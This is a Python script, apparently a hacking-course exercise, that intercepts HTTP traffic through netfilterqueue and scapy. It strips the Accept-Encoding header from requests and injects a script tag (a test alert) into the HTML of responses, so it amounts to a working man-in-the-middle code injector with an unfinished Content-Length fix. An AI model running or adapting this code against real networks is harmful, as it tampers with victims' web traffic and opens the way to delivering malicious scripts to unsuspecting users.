#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP REQUEST:")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)    # question mark means first one

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP RESPONSE:")
            print(scapy_packet.show())
            load = load.replace("</body>", "<script>alert('test1');</script></body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)     # don't include that in the re
            if content_length_search:
                content_length = content_length_search.group(1)
                print(content_length)

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


try:
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    print("\n[+] Detected Control + C. Quiting...")